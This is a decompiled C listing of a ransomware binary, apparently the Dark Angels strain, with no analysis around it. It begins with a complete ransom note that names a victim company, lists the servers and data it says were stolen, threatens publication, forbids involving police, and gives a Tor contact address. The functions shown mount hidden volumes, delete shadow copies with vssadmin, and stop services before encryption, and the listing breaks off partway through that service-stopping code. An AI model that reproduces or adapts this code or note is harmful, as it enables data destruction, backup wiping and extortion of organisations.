/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

_DWORD *sub_404460();
_DWORD *sub_404470();
WCHAR *sub_404480();
FARPROC sub_4046B0();
SC_HANDLE sub_404750();
BOOL sub_404990();
HCRYPTPROV sub_404A60();
int sub_404AB0();
char __cdecl sub_404B00(int a1, int a2, _WORD *a3);
_WORD *__cdecl sub_404C00(int a1, int a2, unsigned __int16 *a3);
void __cdecl sub_404CB0(LPCSTR lpString, LPCSTR a2, int a3);
HANDLE __cdecl sub_404DA0(LPCWSTR lpFileName);
BOOL sub_404DE0();
int __cdecl sub_404E00(int a1, int a2, unsigned __int8 *a3);
unsigned int __cdecl sub_404F00(int a1, int a2);
unsigned int __cdecl sub_404F80(int a1, int a2);
void __cdecl sub_404FD0(int a1, int a2, __int64 a3);
unsigned __int64 __cdecl sub_405020(unsigned __int64 *a1, int *a2, int *a3);
int __cdecl sub_4064B0(_QWORD *a1);
int __cdecl sub_406AF0(unsigned __int64 a1);
int __cdecl sub_406B30(unsigned __int64 a1);
int __cdecl sub_406B70(int a1);
unsigned int __cdecl sub_406DE0(int a1, int *a2, int *a3);
unsigned __int64 __cdecl sub_406E40(unsigned __int64 *a1, int *a2);
unsigned int __cdecl sub_407B30(int a1, int *a2);
int __cdecl sub_407B90(int *a1, unsigned __int8 *a2);
int __cdecl sub_4080F0(int a1, int a2);
int __cdecl sub_408150(int a1, int a2);
int __cdecl sub_408170(int a1, int a2);
int __cdecl sub_408C10(unsigned __int64 *a1, unsigned __int64 *a2, int a3, int a4, int *a5, int *a6, int *a7, int *a8, int *a9);
int __cdecl sub_408EC0(int a1, int a2, int a3);
unsigned int __cdecl sub_408F40(int a1, int a2, int a3, int *a4);
unsigned int __cdecl sub_409270(int a1, int *a2);
WCHAR *__cdecl sub_409720(LPCWSTR lpFileName);
WCHAR *__cdecl sub_40A2B0(LPCWSTR lpString2);
WCHAR *__cdecl sub_40A5C0(LPCWSTR lpString2);
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter);
int __cdecl sub_40A8B0(LPNETRESOURCEW lpNetResource); // idb
DWORD __cdecl sub_40A980(LPWSTR servername);
WCHAR *__cdecl sub_40AAB0(WCHAR a1);
void __noreturn start(); // weak
_DWORD *__thiscall sub_40B130(_DWORD *this);
int __cdecl sub_40B170(_DWORD *a1, int *a2);
int __cdecl sub_40D910(_DWORD *a1);
void sub_40FDC0();
unsigned int __cdecl sub_40FDD0(int a1, int a2, unsigned int a3, unsigned int a4);
_DWORD *__cdecl sub_40FE60(_DWORD *a1, int a2);
int __cdecl sub_4101C0(int a1, _DWORD *a2, _DWORD *a3, int *a4, unsigned int a5);
int __cdecl sub_4104D0(_BYTE *a1, int a2);
int __cdecl sub_410530(int a1);
_DWORD *__cdecl sub_410580(_DWORD *a1, int a2, unsigned int a3);
_DWORD *__cdecl sub_4107C0(_DWORD *a1, int a2);
_DWORD *__cdecl sub_410A30(int a1, unsigned int a2, int a3);
int __cdecl sub_410A80(int a1);
int __cdecl sub_410AD0(_DWORD *a1, int a2);
HANDLE sub_412D60();
unsigned int __cdecl sub_412D70(int a1, char a2, unsigned int a3);
unsigned int __cdecl sub_412DA0(int a1, int a2, unsigned int a3);
LPVOID __cdecl sub_412DE0(int a1);
BOOL __cdecl sub_412E10(LPVOID lpMem);
void __cdecl sub_412E30(int a1, LONG lInitialCount);
int __cdecl sub_412EB0(int a1, int a2, _DWORD *a3);
int __cdecl sub_412F50(int a1, LPCWSTR lpString, int a3); // idb
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL __stdcall Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
unsigned __int64 __stdcall sub_413040(__int64 a1, __int64 a2);
// int __usercall sub_413080@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>);
// int __usercall sub_4130A0@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>);
// unsigned __int64 __usercall sub_4130D0@<edx:eax>(unsigned __int64 a1@<edx:eax>, unsigned __int8 a2@<cl>);
int __stdcall sub_4130F0(unsigned __int64 a1, __int64 a2);
// DWORD __stdcall NetShareEnum(LPWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, LPDWORD resume_handle);
// DWORD __stdcall NetApiBufferFree(LPVOID Buffer);
// DWORD __stdcall RmStartSession(DWORD *pSessionHandle, DWORD dwSessionFlags, WCHAR strSessionKey[]);
// DWORD __stdcall RmEndSession(DWORD dwSessionHandle);
// DWORD __stdcall RmRegisterResources(DWORD dwSessionHandle, UINT nFiles, LPCWSTR rgsFileNames[], UINT nApplications, RM_UNIQUE_PROCESS rgApplications[], UINT nServices, LPCWSTR rgsServiceNames[]);
// DWORD __stdcall RmGetList(DWORD dwSessionHandle, UINT *pnProcInfoNeeded, UINT *pnProcInfo, RM_PROCESS_INFO rgAffectedApps[], LPDWORD lpdwRebootReasons);
// DWORD __stdcall WNetGetConnectionW(LPCWSTR lpLocalName, LPWSTR lpRemoteName, LPDWORD lpnLength);
// DWORD __stdcall WNetOpenEnumW(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
// DWORD __stdcall WNetEnumResourceW(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);

//-------------------------------------------------------------------------
// Data declarations

const CHAR Buffer[] = "--------------------------------------------------------------------------\r\n\r\n                 HELLO dear Management of Ferag AG!\r\n\r\nIf you are reading this message, it means that: \r\n      - your network infrastructure has been compromised, \r\n      - critical data was leaked, \r\n      - files are encrypted,\r\n\t  - backups are deleted\r\n                                                                     \r\n    ------------------------------------------------------\r\n    |                                                    |\r\n    |     by   D A R K    A N G E L S   T E A M  !       |\r\n    |                                                    |\r\n    ------------------------------------------------------\r\n\r\n            The best and only thing you can do is to contact us \r\n              to settle the matter before any losses occurs.                   \r\n\r\n--------------------------------------------------------------------------\r\n\r\n                                  1. THE FOLLOWING IS STRICTLY FORBIDDEN\r\n\r\n\r\n1.1 EDITING FILES ON HDD. \t\r\n                            Renaming, copying or moving any files \r\n                            could DAMAGE the cipher and \r\n                            decryption will be impossible. \r\n\r\n1.2 USING THIRD-PARTY SOFTWARE. \r\n                            Trying to recover with any software \r\n                            can also break the cipher and \r\n                            file recovery will become a problem.\r\n\r\n1.3 SHUTDOWN OR RESTART THE PC. \r\n                            Boot and recovery errors can also damage the cipher. \r\n                            Sorry about that, but doing so is entirely at your own risk.\r\n\r\n1.4 HIRING THE EUROPOL AND OTHERS\r\n                            Cooperating with the EUROPOL, INTERPOL and so on \r\n                            and involving their officers in negotiations \r\n                            will end our communication with you \r\n                            and we will share all the leaked data for free. \r\n\t\t\t\t\t\t\t\r\n--------------------------------------------------------------------------------------------------\r\n                            \r\n                                  2. EXPLANATION OF THE SITUATION\r\n2.1 HOW DID THIS HAPPEN\r\n\r\nThe security of your IT perimeter has been compromised (it's not perfect at all). \r\nWe encrypted your workstations and servers to make the fact of the intrusion visible and to prevent you from hiding critical data leaks.\r\nWe spent a lot of time researching and finding out the most important directories of your business, your weak points. \r\nSo, we has DOWNLOADED about 2.5TB ( ~ 2 500 GBs) of your most SENSITIVE Data just in case if you will NOT PAY, than everything will be PUBLISHED in Media, hacking forums(China, Ukraine, Russia etc) and/or SOLD to any third-party. \r\n\r\n2.2 \"WE HAS COLLECTED SUCH DATA AS: \r\n- Project Files and Drawings(CAD files, Manuals, concept, Konstruktion_MBAU, *.vsd, *.stp, *.dwg, *.odg, *.dws, *.dwt, *.dfx, *.swg, *.ipt, *.iam, *.cdr, *.SLDDRW, *.SLDPRT, *.SLDASM, *.SKP, *.STEP, *.igs, *.iges, *.STL )\r\n- Forschung, HW-Allgemein, Konstruktion_MBAU, Programme, Leittechnik etc\r\n- Oracle Production DB from SRHW8226 & SRHW8239\r\n- MSSQL Production DB from SRHW8042, SRHW8144 etc\r\n- PII - Personal Identification Information !\r\n- HR files, Accountant files\r\n- Most importants files from SRHW8100(srv003) and other FileServers\r\n- Emails and working files of top management and many employees(about 45 PST files)\r\n- Geheimhaltungsvereinbarung(NDA), Patents, Secret and Confidential infromation\r\n- Customer and partner files, including correspondence\r\nand many many more.\r\n\r\n2.3 TO DO LIST (best practies)\r\n                            - Contact us as soon as possible.\r\n                            - Contact us only in our live chat, otherwise you can run into scammers.\r\n                            - Purchase our decryption tool and decrypt your files. There is no other way to do this.\r\n                            - Realize that dealing with us is the shortest way to success and secrecy.\r\n                            - Give up the idea of using decryption help programs, otherwise you will destroy the system permanently.\r\n                            - Avoid any third-party negotiators and recovery groups. They can become the source of leaks.\r\n\r\n--------------------------------------------------------------------------------------------------\r\n\r\n                                  3. POSSIBLE DECISIONS\r\n3.1 NOT MAKING THE DEAL\r\n                            - After 4 days starting tomorrow your leaked data will be Disclosed or sold.\r\n                            - We will also send the data to all interested supervisory organizations and the media.\r\n                            - Decryption key will be deleted permanently and recovery will be impossible.\r\n                            - Losses from the situation can be measured based on your annual budget.\r\n\r\n3.2 MAKING THE WIN-WIN DEAL\r\n                            - You will get the only working Decryption Tool and the how-to-use Manual. \r\n                            - You will get our guarantees (with log provided) of non-recovarable deletion of all your leaked data.\r\n                            - You will get our guarantees of secrecy and removal of all traces related to the deal in the Internet. \r\n                            - You will get our security report on how to fix your security breaches.\r\n\t\t\t\t\t\t\t- You will get our Advanced Penetration Test Report about your security.\r\n\t\t\t\t\t\t\t- We guarantee the removal of all backdoors in your network\r\n                    \r\n--------------------------------------------------------------------------------------------------\r\n\r\n                                  4. EVIDENCE OF THE LEAKAGE\r\n\r\n\r\nhttps://ibb.co/DwvjRYb\r\nhttps://ibb.co/kKTBb7f\r\nhttps://ibb.co/NSwsBrx\r\nhttps://ibb.co/m5cpyQh\r\nhttps://ibb.co/2P6GHZh\r\nhttps://ibb.co/9c7Fwmm\r\nhttps://ibb.co/gtM5cZZ\r\nhttps://ibb.co/PQ3rKp2\r\nhttps://ibb.co/cFKkZgJ\r\nhttps://ibb.co/nC4F840\r\nhttps://ibb.co/WsB6WwM\r\nhttps://ibb.co/6Rx43w1\r\nhttps://ibb.co/bv4RXDS\r\nhttps://ibb.co/kMxZhc1\r\nhttps://ibb.co/4YGTFcF\r\nhttps://ibb.co/nnVMxdn\r\nhttps://ibb.co/t8jFk12\r\nhttps://ibb.co/j361Chq\r\nhttps://ibb.co/N3yyNNK\r\nhttps://ibb.co/M25fg2v\r\nhttps://ibb.co/z4N6m14\r\nhttps://ibb.co/yVmQdws\r\n\r\n--------------------------------------------------------------------------------------------------\r\n\r\n                                  5. HOW TO CONTACT US\r\n\r\n5.1 Download and install TOR Browser https://torproject.org\r\n5.2 Go to our live-chat website at https://wemo2ysyeq6km2nqhcrz63dkdhez3j25yw2nvn7xba2z4h7v7gyrfgid.onion/page/Ferag_AG_373253f9eb252e\r\n5.3 You can request additional Proof Pack with your data in our live chat to review. \r\n5.4 In case TOR Browser is restricted in your area use VPN services.\r\n5.5 All leaked Data will be Disclosed in 4 Days if you remain silent.\r\n5.6 Your Decryption keys will be permanently destroyed at the moment the leaked Data is Disclosed.\r\n5.7 Your Data will immediately Disclosed if you will hire third-party negotiators to contact us.\r\n\r\n--------------------------------------------------------------------------------------------------\r\n\r\n                                  6. RESPONSIBILITY\r\n\r\n6.1 Breaking critical points of this offer will cause:\r\n                            - Deletion of your decryption keys.\r\n                            - Immediate sale or complete Disclosure of your leaked data.\r\n                            - Notification of government supervision agencies, your competitors and clients.\r\n--------------------------------------------------------------------------------------------------\r\n"; // idb
int dword_403C68[] = { 0 }; // weak
int SHA256_Constants_404068[] = { 1779033703 }; // weak
int dword_40406C[] = { -205731576 }; // weak
int SHA512_Constants_4040A8[] = { 1116352408 }; // weak
int SHA512_Constants_4040AC[] = { -685199838 }; // weak
int SHA512_Constants_4040B0[] = { 1899447441 }; // weak
int dword_4040B4[] = { 602891725 }; // weak
int SHA512_Constants_4040B8[] = { -1245643825 }; // weak
int dword_4040BC[] = { -330482897 }; // weak
int SHA512_Constants_4040C0[] = { -373957723 }; // weak
int dword_4040C4[] = { -2121671748 }; // weak
int dword_4040C8[] = { 961987163 }; // weak
int dword_4040CC[] = { -213338824 }; // weak
int dword_4040D0[] = { 1508970993 }; // weak
int dword_4040D4[] = { -1241133031 }; // weak
int dword_4040D8[] = { -1841331548 }; // weak
int dword_4040DC[] = { -1357295717 }; // weak
int dword_4040E0[] = { -1424204075 }; // weak
int dword_4040E4[] = { -630357736 }; // weak
LPCSTR lpServiceName = &dword_401000; // idb
LPCWSTR lpString1 = L"sql.exe"; // idb
LPCWSTR lpString2 = NULL; // idb
unsigned __int8 byte_4141B8[40] =
{
  84u,
  236u,
  153u,
  23u,
  73u,
  185u,
  234u,
  148u,
  77u,
  173u,
  43u,
  107u,
  43u,
  67u,
  61u,
  16u,
  240u,
  97u,
  115u,
  88u,
  77u,
  74u,
  63u,
  237u,
  147u,
  94u,
  183u,
  118u,
  143u,
  33u,
  99u,
  7u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u
}; // weak
HANDLE hObject = NULL; // idb
struct _RTL_CRITICAL_SECTION CriticalSection = { NULL, 0, 0, NULL, NULL, 0u }; // idb
_DWORD dword_4141FC[12] = { 0,  }; // weak
_DWORD dword_41422C[12]; // weak
int dword_41425C; // weak
HCRYPTPROV hProv; // idb
HANDLE hHeap; // idb
// extern BOOL (__stdcall *QueryServiceStatusEx)(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *EnumDependentServicesA)(SC_HANDLE hService, DWORD dwServiceState, LPENUM_SERVICE_STATUSA lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned);
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern DWORD (__stdcall *GetTickCount)();
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern BOOL (__stdcall *SetVolumeMountPointW)(LPCWSTR lpszVolumeMountPoint, LPCWSTR lpszVolumeName);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern void (__stdcall __noreturn *ExitThread)(DWORD dwExitCode);
// extern BOOL (__stdcall *SetProcessShutdownParameters)(DWORD dwLevel, DWORD dwFlags);
// extern void (__stdcall *GetSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern HANDLE (__stdcall *OpenMutexA)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName);
// extern BOOL (__stdcall *MoveFileExW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFlags);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *ReleaseSemaphore)(HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount);
// extern HANDLE (__stdcall *CreateSemaphoreA)(LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCSTR lpName);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *GetVolumePathNamesForVolumeNameW)(LPCWSTR lpszVolumeName, LPWCH lpszVolumePathNames, DWORD cchBufferLength, PDWORD lpcchReturnLength);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern BOOL (__stdcall *FindVolumeClose)(HANDLE hFindVolume);
// extern BOOL (__stdcall *FindNextVolumeW)(HANDLE hFindVolume, LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern HANDLE (__stdcall *FindFirstVolumeW)(LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern HRESULT (__stdcall *SHEmptyRecycleBinA)(HWND hwnd, LPCSTR pszRootPath, DWORD dwFlags);
// extern LPWSTR *(__stdcall *CommandLineToArgvW)(LPCWSTR lpCmdLine, int *pNumArgs);
// extern HINSTANCE (__stdcall *ShellExecuteW)(HWND hwnd, LPCWSTR lpOperation, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, INT nShowCmd);
// extern int (*wsprintfA)(LPSTR, LPCSTR, ...);


//----- (00404460) --------------------------------------------------------
_DWORD *sub_404460()
{
  return sub_40B130(dword_4141FC);
}
// 4141FC: using guessed type _DWORD dword_4141FC[12];

//----- (00404470) --------------------------------------------------------
_DWORD *sub_404470()
{
  return sub_40B130(dword_41422C);
}
// 41422C: using guessed type _DWORD dword_41422C[12];

//----- (00404480) --------------------------------------------------------
WCHAR *sub_404480()
{
  WCHAR *result; // eax
  WCHAR szVolumePathNames[260]; // [esp+0h] [ebp-2F4h] BYREF
  LPCWSTR lpszVolumeMountPoint[26]; // [esp+208h] [ebp-ECh]
  LPCWSTR lpRootPathName[26]; // [esp+270h] [ebp-84h]
  DWORD cchBufferLength; // [esp+2D8h] [ebp-1Ch]
  DWORD cchReturnLength; // [esp+2DCh] [ebp-18h] BYREF
  LPVOID lpMem; // [esp+2E0h] [ebp-14h]
  HANDLE hFindVolume; // [esp+2E4h] [ebp-10h]
  int i; // [esp+2E8h] [ebp-Ch]
  LPWSTR lpszVolumeName; // [esp+2ECh] [ebp-8h]
  int v10; // [esp+2F0h] [ebp-4h]

  lpRootPathName[0] = L"Q:\\";
  lpRootPathName[1] = L"W:\\";
  lpRootPathName[2] = L"E:\\";
  lpRootPathName[3] = L"R:\\";
  lpRootPathName[4] = L"T:\\";
  lpRootPathName[5] = L"Y:\\";
  lpRootPathName[6] = L"U:\\";
  lpRootPathName[7] = L"I:\\";
  lpRootPathName[8] = L"O:\\";
  lpRootPathName[9] = L"P:\\";
  lpRootPathName[10] = L"A:\\";
  lpRootPathName[11] = L"S:\\";
  lpRootPathName[12] = L"D:\\";
  lpRootPathName[13] = L"F:\\";
  lpRootPathName[14] = L"G:\\";
  lpRootPathName[15] = L"H:\\";
  lpRootPathName[16] = L"J:\\";
  lpRootPathName[17] = L"K:\\";
  lpRootPathName[18] = L"L:\\";
  lpRootPathName[19] = L"Z:\\";
  lpRootPathName[20] = L"X:\\";
  lpRootPathName[21] = L"C:\\";
  lpRootPathName[22] = L"V:\\";
  lpRootPathName[23] = L"B:\\";
  lpRootPathName[24] = L"N:\\";
  lpRootPathName[25] = L"M:\\";
  v10 = 0;
  cchBufferLength = 120;
  cchReturnLength = 0;
  for ( i = 0; i < 26; ++i )
  {
    if ( GetDriveTypeW(lpRootPathName[i]) == 1 )
      lpszVolumeMountPoint[v10++] = lpRootPathName[i];
  }
  szVolumePathNames[0] = 0;
  result = (WCHAR *)sub_412DE0(0x10000);
  lpszVolumeName = result;
  if ( result )
  {
    lpMem = sub_412DE0(0x10000);
    if ( lpMem )
    {
      hFindVolume = FindFirstVolumeW(lpszVolumeName, 0x8000u);
      do
      {
        if ( !v10 )
          break;
        if ( GetVolumePathNamesForVolumeNameW(lpszVolumeName, szVolumePathNames, cchBufferLength, &cchReturnLength)
          && lstrlenW(szVolumePathNames) == 3 )
        {
          szVolumePathNames[0] = 0;
        }
        else
        {
          SetVolumeMountPointW(lpszVolumeMountPoint[--v10], lpszVolumeName);
        }
      }
      while ( FindNextVolumeW(hFindVolume, lpszVolumeName, 0x8000u) );
      FindVolumeClose(hFindVolume);
      sub_412E10(lpMem);
    }
    return (WCHAR *)sub_412E10(lpszVolumeName);
  }
  return result;
}
// 401590: using guessed type wchar_t aQ[4];
// 401598: using guessed type wchar_t aW[4];
// 4015A0: using guessed type wchar_t aE[4];
// 4015A8: using guessed type wchar_t aR[4];
// 4015B0: using guessed type wchar_t aT[4];
// 4015B8: using guessed type wchar_t aY[4];
// 4015C0: using guessed type wchar_t aU[4];
// 4015C8: using guessed type wchar_t aI[4];
// 4015D0: using guessed type wchar_t aO[4];
// 4015D8: using guessed type wchar_t aP[4];
// 4015E0: using guessed type wchar_t aA[4];
// 4015E8: using guessed type wchar_t aS[4];
// 4015F0: using guessed type wchar_t aD[4];
// 4015F8: using guessed type wchar_t asc_4015F8[4];
// 401600: using guessed type wchar_t aG[4];
// 401608: using guessed type wchar_t asc_401608[4];
// 401610: using guessed type wchar_t aJ[4];
// 401618: using guessed type wchar_t aK[4];
// 401620: using guessed type wchar_t asc_401620[4];
// 401628: using guessed type wchar_t aZ[4];
// 401630: using guessed type wchar_t asc_401630[4];
// 401638: using guessed type wchar_t aC[4];
// 401640: using guessed type wchar_t aV[4];
// 401648: using guessed type wchar_t aB[4];
// 401650: using guessed type wchar_t aN[4];
// 401658: using guessed type wchar_t aM[4];
// 404480: using guessed type LPCWSTR lpszVolumeMountPoint[26];

//----- (004046B0) --------------------------------------------------------
FARPROC sub_4046B0()
{
  FARPROC result; // eax
  HMODULE LibraryA; // [esp+0h] [ebp-14h]
  HMODULE hModule; // [esp+4h] [ebp-10h]
  int v3; // [esp+Ch] [ebp-8h] BYREF
  BOOL (__stdcall *Wow64DisableWow64FsRedirection)(PVOID *); // [esp+10h] [ebp-4h]

  v3 = 0;
  if ( sub_404AB0() )
  {
    hModule = LoadLibraryA("kernel32.dll");
    Wow64DisableWow64FsRedirection = (BOOL (__stdcall *)(PVOID *))GetProcAddress(
                                                                    hModule,
                                                                    "Wow64DisableWow64FsRedirection");
    if ( Wow64DisableWow64FsRedirection )
      Wow64DisableWow64FsRedirection((PVOID *)&v3);
  }
  ShellExecuteW(0, L"open", L"cmd.exe", L"/c vssadmin.exe delete shadows /all /quiet", 0, 0);
  result = (FARPROC)sub_404AB0();
  if ( result )
  {
    LibraryA = LoadLibraryA("kernel32.dll");
    result = GetProcAddress(LibraryA, "Wow64RevertWow64FsRedirection");
    if ( result )
      return (FARPROC)((int (__stdcall *)(int))result)(v3);
  }
  return result;
}

//----- (00404750) --------------------------------------------------------
SC_HANDLE sub_404750()
{
  SC_HANDLE result; // eax
  LPCSTR lpServiceName[9]; // [esp+8h] [ebp-90h] BYREF
  struct _SERVICE_STATUS ServiceStatus; // [esp+2Ch] [ebp-6Ch] BYREF
  struct _SERVICE_STATUS Buffer; // [esp+50h] [ebp-48h] BYREF
  DWORD ServicesReturned; // [esp+74h] [ebp-24h] BYREF
  unsigned int v5; // [esp+78h] [ebp-20h]
  DWORD TickCount; // [esp+7Ch] [ebp-1Ch]
  SC_HANDLE hSCManager; // [esp+80h] [ebp-18h]
  SC_HANDLE hSCObject; // [esp+84h] [ebp-14h]
  unsigned int i; // [esp+88h] [ebp-10h]
  DWORD pcbBytesNeeded; // [esp+8Ch] [ebp-Ch] BYREF
  LPENUM_SERVICE_STATUSA lpServices; // [esp+90h] [ebp-8h]
  SC_HANDLE hService; // [esp+94h] [ebp-4h]

  lpServices = 0;
  TickCount = GetTickCount();
  v5 = 30000;
  result = OpenSCManagerA(0, 0, 0xF003Fu);
  hSCManager = result;
  if ( result )
  {
    for ( i = 0; i < 0x2C; ++i )
    {
      hService = OpenServiceA(hSCManager, (&::lpServiceName)[i], 0x2Cu);
      if ( hService )
      {
        if ( QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &pcbBytesNeeded)
          && Buffer.dwCurrentState != 1
          && Buffer.dwCurrentState != 3 )
        {
          if ( !EnumDependentServicesA(hService, 1u, lpServices, 0, &pcbBytesNeeded, &ServicesReturned)
            && GetLastError() == 234 )
          {
            lpServices = (LPENUM_SERVICE_STATUSA)sub_412DE0(pcbBytesNeeded);
            if ( lpServices )
            {
              if ( EnumDependentServicesA(hService, 1u, lpServices, pcbBytesNeeded, &pcbBytesNeeded, &ServicesReturned) )
              {
                qmemcpy(lpServiceName, &lpServices[i], sizeof(lpServiceName));
                hSCObject = OpenServiceA(hSCManager, lpServiceName[0], 0x24u);
                if ( hSCObject )
                {
                  if ( ControlService(hSCObject, 1u, &ServiceStatus) )
                  {
                    while ( ServiceStatus.dwCurrentState != 1 )
                    {
                      Sleep(ServiceStatus.dwWaitHint);
                      if ( QueryServiceStatusEx(
                             hSCObject,
                             SC_STATUS_PROCESS_INFO,
                             (LPBYTE)&ServiceStatus,
                             0x24u,
                             &pcbBytesNeeded) )
                      {
                        if ( ServiceStatus.dwCurrentState == 1 || GetTickCount() - TickCount > v5 )
                          break;
                      }
                    }
                    CloseServiceHandle(hSCObject);
                  }
                }
              }
              sub_412E10(lpServices);
            }
          }
          if ( ControlService(hService, 1u, &Buffer) )
          {
            do
            {
              if ( Buffer.dwCurrentState == 1 )
                break;
              Sleep(Buffer.dwWaitHint);
